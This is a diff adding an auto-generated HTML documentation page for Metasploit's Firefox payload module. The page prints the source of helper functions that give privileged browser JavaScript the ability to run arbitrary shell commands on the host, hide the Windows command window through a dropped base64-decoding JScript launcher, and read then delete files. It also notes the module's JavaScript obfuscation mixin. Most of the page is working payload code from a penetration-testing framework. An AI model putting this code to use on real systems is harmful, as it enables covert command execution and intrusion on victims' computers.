@@ -1,0 +1,898 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>
+  Module: Msf::Payload::Firefox
+  
+    &mdash; Documentation by YARD 0.9.26
+  
+</title>
+
+  <link rel="stylesheet" href="../../css/style.css" type="text/css" />
+
+  <link rel="stylesheet" href="../../css/common.css" type="text/css" />
+
+<script type="text/javascript">
+  pathId = "Msf::Payload::Firefox";
+  relpath = '../../';
+</script>
+
+
+  <script type="text/javascript" charset="utf-8" src="../../js/jquery.js"></script>
+
+  <script type="text/javascript" charset="utf-8" src="../../js/app.js"></script>
+
+
+  </head>
+  <body>
+    <div class="nav_wrap">
+      <iframe id="nav" src="../../class_list.html?1"></iframe>
+      <div id="resizer"></div>
+    </div>
+
+    <div id="main" tabindex="-1">
+      <div id="header">
+        <div id="menu">
+  
+    <a href="../../_index.html">Index (F)</a> &raquo;
+    <span class='title'><span class='object_link'><a href="../../Msf.html" title="Msf (module)">Msf</a></span></span> &raquo; <span class='title'><span class='object_link'><a href="../Payload.html" title="Msf::Payload (class)">Payload</a></span></span>
+     &raquo; 
+    <span class="title">Firefox</span>
+  
+</div>
+
+        <div id="search">
+  
+    <a class="full_list_link" id="class_list_link"
+        href="../../class_list.html">
+
+        <svg width="24" height="24">
+          <rect x="0" y="4" width="24" height="4" rx="1" ry="1"></rect>
+          <rect x="0" y="12" width="24" height="4" rx="1" ry="1"></rect>
+          <rect x="0" y="20" width="24" height="4" rx="1" ry="1"></rect>
+        </svg>
+    </a>
+  
+</div>
+        <div class="clear"></div>
+      </div>
+
+      <div id="content"><h1>Module: Msf::Payload::Firefox
+  
+  
+  
+</h1>
+<div class="box_info">
+  
+
+  
+  
+  
+  
+  <dl>
+      <dt>Includes:</dt>
+      <dd><span class='object_link'><a href="../Exploit/JSObfu.html" title="Msf::Exploit::JSObfu (module)">Exploit::JSObfu</a></span></dd>
+  </dl>
+  
+  
+
+  
+
+  
+  <dl>
+    <dt>Defined in:</dt>
+    <dd>lib/msf/core/payload/firefox.rb</dd>
+  </dl>
+  
+</div>
+
+
+
+
+
+
+
+
+  
+    <h2>
+      Instance Method Summary
+      <small><a href="#" class="summary_toggle">collapse</a></small>
+    </h2>
+
+    <ul class="summary">
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#jscript_launcher-instance_method" title="#jscript_launcher (instance method)">#<strong>jscript_launcher</strong>  &#x21d2; String </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>This file is dropped on the windows platforms to a temp file in order to prevent the cmd.exe prompt from appearing.</p>
+</div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#read_file_source-instance_method" title="#read_file_source (instance method)">#<strong>read_file_source</strong>  &#x21d2; String </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>Javascript source code of readFile(path) - synchronously reads a file and returns its contents.</p>
+</div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#read_until_token_source-instance_method" title="#read_until_token_source (instance method)">#<strong>read_until_token_source</strong>  &#x21d2; String </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>Javascript source of readUntilToken(s) Continues reading the stream as data is available, until a pair of   command tokens like [[aBcD123ffh]] [[aBcD123ffh]] is consumed.</p>
+</div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#run_cmd_source-instance_method" title="#run_cmd_source (instance method)">#<strong>run_cmd_source</strong>  &#x21d2; String </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>Javascript source code of runCmd(str,cb) - runs a shell command on the OS.</p>
+</div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#set_timeout_source-instance_method" title="#set_timeout_source (instance method)">#<strong>set_timeout_source</strong>  &#x21d2; String </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>Javascript source code of setTimeout(fn, delay).</p>
+</div></span>
+  
+</li>
+
+      
+    </ul>
+  
+
+
+  
+  
+  
+  
+  
+  
+  
+  
+  <h3 class="inherited">Methods included from <span class='object_link'><a href="../Exploit/JSObfu.html" title="Msf::Exploit::JSObfu (module)">Exploit::JSObfu</a></span></h3>
+  <p class="inherited"><span class='object_link'><a href="../Exploit/JSObfu.html#initialize-instance_method" title="Msf::Exploit::JSObfu#initialize (method)">#initialize</a></span>, <span class='object_link'><a href="../Exploit/JSObfu.html#js_obfuscate-instance_method" title="Msf::Exploit::JSObfu#js_obfuscate (method)">#js_obfuscate</a></span></p>
+
+
+  <div id="instance_method_details" class="method_details_list">
+    <h2>Instance Method Details</h2>
+
+    
+      <div class="method_details first">
+  <h3 class="signature first" id="jscript_launcher-instance_method">
+  
+    #<strong>jscript_launcher</strong>  &#x21d2; <tt>String</tt> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>This file is dropped on the windows platforms to a temp file in order to prevent the cmd.exe prompt from appearing. It is executed and then deleted.</p>
+
+<p>Note: we should totally add a powershell replacement here.</p>
+
+<p>base64 and runs it as a shell command.</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  
+<p class="tag_title">Returns:</p>
+<ul class="return">
+  
+    <li>
+      
+      
+        <span class='type'>(<tt>String</tt>)</span>
+      
+      
+      
+        &mdash;
+        <div class='inline'>
+<p>JScript that reads its command-line argument, decodes</p>
+</div>
+      
+    </li>
+  
+</ul>
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+216
+217
+218
+219
+220
+221
+222
+223
+224
+225
+226
+227
+228</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/firefox.rb', line 216</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_jscript_launcher'>jscript_launcher</span>
+  <span class='tstring'><span class='tstring_beg'>%Q|</span><span class='tstring_content'>
+    var b64 = WScript.arguments(0);
+    var dom = new ActiveXObject(&quot;MSXML2.DOMDocument.3.0&quot;);
+    var el  = dom.createElement(&quot;root&quot;);
+    el.dataType = &quot;bin.base64&quot;; el.text = b64; dom.appendChild(el);
+    var stream = new ActiveXObject(&quot;ADODB.Stream&quot;);
+    stream.Type=1; stream.Open(); stream.Write(el.nodeTypedValue);
+    stream.Position=0; stream.type=2; stream.CharSet = &quot;us-ascii&quot;; stream.Position=0;
+    var cmd = stream.ReadText();
+    (new ActiveXObject(&quot;WScript.Shell&quot;)).Run(cmd, 0, true);
+  </span><span class='tstring_end'>|</span></span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="read_file_source-instance_method">
+  
+    #<strong>read_file_source</strong>  &#x21d2; <tt>String</tt> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>Javascript source code of readFile(path) - synchronously reads a file and returns its contents. The file is deleted immediately afterwards.</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  
+<p class="tag_title">Returns:</p>
+<ul class="return">
+  
+    <li>
+      
+      
+        <span class='type'>(<tt>String</tt>)</span>
+      
+      
+      
+        &mdash;
+        <div class='inline'>
+<p>javascript source code that exposes the readFile(path) method</p>
+</div>
+      
+    </li>
+  
+</ul>
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76
+77
+78
+79
+80
+81</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/firefox.rb', line 56</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_read_file_source'>read_file_source</span>
+  <span class='tstring'><span class='tstring_beg'>%Q|</span><span class='tstring_content'>
+    var readFile = function(path) {
+      try {
+        var file = Components.classes[&quot;@mozilla.org/file/local;1&quot;]
+                 .createInstance(Components.interfaces.nsILocalFile);
+        file.initWithPath(path);
+
+        var fileStream = Components.classes[&quot;@mozilla.org/network/file-input-stream;1&quot;]
+                         .createInstance(Components.interfaces.nsIFileInputStream);
+        fileStream.init(file, 1, 0, false);
+
+        var binaryStream = Components.classes[&quot;@mozilla.org/binaryinputstream;1&quot;]
+                           .createInstance(Components.interfaces.nsIBinaryInputStream);
+        binaryStream.setInputStream(fileStream);
+        var array = binaryStream.readByteArray(fileStream.available());
+
+        binaryStream.close();
+        fileStream.close();
+        file.remove(true);
+
+        return array.map(function(aItem) { return String.fromCharCode(aItem); }).join(&quot;&quot;);
+      } catch (e) { return &quot;&quot;; }
+    };
+  </span><span class='tstring_end'>|</span></span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="read_until_token_source-instance_method">
+  
+    #<strong>read_until_token_source</strong>  &#x21d2; <tt>String</tt> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>Javascript source of readUntilToken(s) Continues reading the stream as data is available, until a pair of</p>
+
+<pre class="code ruby"><code class="ruby">command tokens like [[aBcD123ffh]] [[aBcD123ffh]] is consumed.
+</code></pre>
+
+<p>Returns a function that can be passed to the #onDataAvailable callback of</p>
+
+<pre class="code ruby"><code class="ruby">nsIInputStreamPump that will buffer until a second token is read, or, in
+the absence of any tokens, a newline character is read.
+</code></pre>
+
+
+  </div>
+</div>
+<div class="tags">
+  
+<p class="tag_title">Returns:</p>
+<ul class="return">
+  
+    <li>
+      
+      
+        <span class='type'>(<tt>String</tt>)</span>
+      
+      
+      
+        &mdash;
+        <div class='inline'>
+<p>javascript source code that exposes the readUntilToken(cb) function</p>
+</div>
+      
+    </li>
+  
+</ul>
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/firefox.rb', line 30</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_read_until_token_source'>read_until_token_source</span>
+  <span class='tstring'><span class='tstring_beg'>%Q|</span><span class='tstring_content'>
+    var readUntilToken = function(cb) {
+      Components.utils.import(&quot;resource://gre/modules/NetUtil.jsm&quot;);
+
+      var buffer = &#39;&#39;, m = null;
+      return function(request, context, stream, offset, count) {
+        buffer += NetUtil.readInputStreamToString(stream, count);
+        if (buffer.match(/^(\\[\\[\\w{8}\\]\\])/)) {
+          if (m = buffer.match(/^(\\[\\[\\w{8}\\]\\])([\\s\\S]*)\\1/)) {
+            cb(m[2]);
+            buffer = &#39;&#39;;
+          }
+        } else if (buffer.indexOf(&quot;\\n&quot;) &gt; -1) {
+          cb(buffer);
+          buffer = &#39;&#39;;
+        }
+      };
+    };
+  </span><span class='tstring_end'>|</span></span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="run_cmd_source-instance_method">
+  
+    #<strong>run_cmd_source</strong>  &#x21d2; <tt>String</tt> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>Javascript source code of runCmd(str,cb) - runs a shell command on the OS</p>
+
+<p>Because of a limitation of firefox, we cannot retrieve the shell output so the stdout/err are instead redirected to a temp file, which is read and destroyed after the command completes.</p>
+
+<p>On posix, the command is double wrapped in “/bin/sh -c” calls, the outer of which redirects stdout.</p>
+
+<p>On windows, the command is wrapped in two “cmd /c” calls, the outer of which redirects stdout. A JScript “launch” file is dropped and invoked with wscript to run the command without displaying the cmd.exe prompt.</p>
+
+<p>When the command contains the pattern “[JAVASCRIPT] … [/JAVASCRIPT]”, the javascript code between the tags is eval&#39;d and returned.</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  
+<p class="tag_title">Returns:</p>
+<ul class="return">
+  
+    <li>
+      
+      
+        <span class='type'>(<tt>String</tt>)</span>
+      
+      
+      
+        &mdash;
+        <div class='inline'>
+<p>javascript source code that exposes the runCmd(str) method.</p>
+</div>
+      
+    </li>
+  
+</ul>
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+100
+101
+102
+103
+104
+105
+106
+107
+108
+109
+110
+111
+112
+113
+114
+115
+116
+117
+118
+119
+120
+121
+122
+123
+124
+125
+126
+127
+128
+129
+130
+131
+132
+133
+134
+135
+136
+137
+138
+139
+140
+141
+142
+143
+144
+145
+146
+147
+148
+149
+150
+151
+152
+153
+154
+155
+156
+157
+158
+159
+160
+161
+162
+163
+164
+165
+166
+167
+168
+169
+170
+171
+172
+173
+174
+175
+176
+177
+178
+179
+180
+181
+182
+183
+184
+185
+186
+187
+188
+189
+190
+191
+192
+193
+194
+195
+196
+197
+198
+199
+200
+201
+202
+203
+204
+205
+206
+207</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/firefox.rb', line 100</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_run_cmd_source'>run_cmd_source</span>
+  <span class='tstring'><span class='tstring_beg'>%Q|</span><span class='tstring_content'>
+    </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_read_file_source'>read_file_source</span><span class='embexpr_end'>}</span><span class='tstring_content'>
+    </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_set_timeout_source'>set_timeout_source</span><span class='embexpr_end'>}</span><span class='tstring_content'>
+
+    var ua = Components.classes[&quot;@mozilla.org/network/protocol;1?name=http&quot;]
+      .getService(Components.interfaces.nsIHttpProtocolHandler).userAgent;
+    var windows = (ua.indexOf(&quot;Windows&quot;)&gt;-1);
+    var svcs = Components.utils.import(&quot;resource://gre/modules/Services.jsm&quot;);
+    var jscript = (</span><span class='embexpr_beg'>#{</span><span class='const'>JSON</span><span class='period'>.</span><span class='id identifier rubyid_unparse'>unparse</span><span class='lparen'>(</span><span class='lbrace'>{</span><span class='symbol'>:src</span> <span class='op'>=&gt;</span> <span class='id identifier rubyid_jscript_launcher'>jscript_launcher</span><span class='rbrace'>}</span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>).src;
+    var runCmd = function(cmd, cb) {
+      cb = cb \|\| (function(){});
+
+      if (cmd.trim().length == 0) {
+        setTimeout(function(){ cb(&quot;Command is empty string (&#39;&#39;).&quot;); });
+        return;
+      }
+
+      var js = (/^\\s*\\[JAVASCRIPT\\]([\\s\\S]*)\\[\\/JAVASCRIPT\\]/g).exec(cmd.trim());
+      if (js) {
+        var tag = &quot;[!JAVASCRIPT]&quot;;
+        var sync = true;  /* avoid zalgo&#39;s reach */
+        var sent = false;
+        var retVal = null;
+
+        try {
+          this.send = function(r){
+            if (sent) return;
+            sent = true;
+            if (r) {
+              if (sync) setTimeout(function(){ cb(false, r+tag+&quot;\\n&quot;); });
+              else      cb(false, r+tag+&quot;\\n&quot;);
+            }
+          };
+          retVal = Function(js[1]).call(this);
+        } catch (e) { retVal = e.message; }
+
+        sync = false;
+
+        if (retVal &amp;&amp; !sent) {
+          sent = true;
+          setTimeout(function(){ cb(false, retVal+tag+&quot;\\n&quot;); });
+        }
+
+        return;
+      }
+
+      var shEsc = &quot;\\\\$&amp;&quot;;
+      var shPath = &quot;/bin/sh -c&quot;;
+
+      if (windows) {
+        shPath = &quot;cmd /c&quot;;
+        shEsc = &quot;\\^$&amp;&quot;;
+        var jscriptFile = Components.classes[&quot;@mozilla.org/file/directory_service;1&quot;]
+          .getService(Components.interfaces.nsIProperties)
+          .get(&quot;TmpD&quot;, Components.interfaces.nsIFile);
+        jscriptFile.append(&#39;</span><span class='embexpr_beg'>#{</span><span class='const'><span class='object_link'><a href="../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'>Text</span><span class='period'>.</span><span class='id identifier rubyid_rand_text_alphanumeric'>rand_text_alphanumeric</span><span class='lparen'>(</span><span class='int'>8</span><span class='op'>+</span><span class='id identifier rubyid_rand'>rand</span><span class='lparen'>(</span><span class='int'>12</span><span class='rparen'>)</span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>.js&#39;);
+        var stream = Components.classes[&quot;@mozilla.org/network/safe-file-output-stream;1&quot;]
+          .createInstance(Components.interfaces.nsIFileOutputStream);
+        stream.init(jscriptFile, 0x04 \| 0x08 \| 0x20, 0666, 0);
+        stream.write(jscript, jscript.length);
+        if (stream instanceof Components.interfaces.nsISafeOutputStream) {
+          stream.finish();
+        } else {
+          stream.close();
+        }
+      }
+
+      var stdoutFile = &quot;</span><span class='embexpr_beg'>#{</span><span class='const'><span class='object_link'><a href="../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'>Text</span><span class='period'>.</span><span class='id identifier rubyid_rand_text_alphanumeric'>rand_text_alphanumeric</span><span class='lparen'>(</span><span class='int'>8</span><span class='op'>+</span><span class='id identifier rubyid_rand'>rand</span><span class='lparen'>(</span><span class='int'>12</span><span class='rparen'>)</span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>&quot;;
+
+      var stdout = Components.classes[&quot;@mozilla.org/file/directory_service;1&quot;]
+        .getService(Components.interfaces.nsIProperties)
+        .get(&quot;TmpD&quot;, Components.interfaces.nsIFile);
+      stdout.append(stdoutFile);
+
+      var shell;
+      cmd = cmd.trim();
+      if (windows) {
+        shell = shPath+&quot; &quot;+cmd;
+        shell = shPath+&quot; &quot;+shell.replace(/\\W/g, shEsc)+&quot; &gt;&quot;+stdout.path+&quot; 2&gt;&amp;1&quot;;
+        var b64 = svcs.btoa(shell);
+      } else {
+        shell = shPath+&quot; &quot;+cmd.replace(/\\W/g, shEsc);
+        shell = shPath+&quot; &quot;+shell.replace(/\\W/g, shEsc) + &quot; &gt;&quot;+stdout.path+&quot; 2&gt;&amp;1&quot;;
+      }
+
+      var process = Components.classes[&quot;@mozilla.org/process/util;1&quot;]
+        .createInstance(Components.interfaces.nsIProcess);
+      var sh = Components.classes[&quot;@mozilla.org/file/local;1&quot;]
+                 .createInstance(Components.interfaces.nsILocalFile);
+
+      if (windows) {
+        sh.initWithPath(&quot;C:\\\\Windows\\\\System32\\\\wscript.exe&quot;);
+        process.init(sh);
+        var args = [jscriptFile.path, b64];
+        process.run(true, args, args.length);
+        jscriptFile.remove(true);
+        setTimeout(function(){cb(false, cmd+&quot;\\n&quot;+readFile(stdout.path));});
+      } else {
+        sh.initWithPath(&quot;/bin/sh&quot;);
+        process.init(sh);
+        var args = [&quot;-c&quot;, shell];
+        process.run(true, args, args.length);
+        setTimeout(function(){cb(false, readFile(stdout.path));});
+      }
+    };
+  </span><span class='tstring_end'>|</span></span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="set_timeout_source-instance_method">
+  
+    #<strong>set_timeout_source</strong>  &#x21d2; <tt>String</tt> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>Javascript source code of setTimeout(fn, delay)</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  
+<p class="tag_title">Returns:</p>
+<ul class="return">
+  
+    <li>
+      
+      
+        <span class='type'>(<tt>String</tt>)</span>
+      
+      
+      
+        &mdash;
+        <div class='inline'>
+<p>javascript source code that exposes the setTimeout(fn, delay) method</p>
+</div>
+      
+    </li>
+  
+</ul>
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+11
+12
+13
+14
+15
+16
+17
+18
+19</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/firefox.rb', line 11</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_set_timeout_source'>set_timeout_source</span>
+  <span class='tstring'><span class='tstring_beg'>%Q|</span><span class='tstring_content'>
+    var setTimeout = function(cb, delay) {
+      var timer = Components.classes[&quot;@mozilla.org/timer;1&quot;].createInstance(Components.interfaces.nsITimer);
+      timer.initWithCallback({notify:cb}, delay, Components.interfaces.nsITimer.TYPE_ONE_SHOT);
+      return timer;
+    };
+  </span><span class='tstring_end'>|</span></span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+  </div>
+
+</div>
+
+      <div id="footer">
+  Generated on Wed Mar 31 00:30:24 2021 by
+  <a href="http://yardoc.org" title="Yay! A Ruby Documentation Tool" target="_parent">yard</a>
+  0.9.26 (ruby-2.7.2).
+</div>
+
+    </div>
+  </body>
+</html>
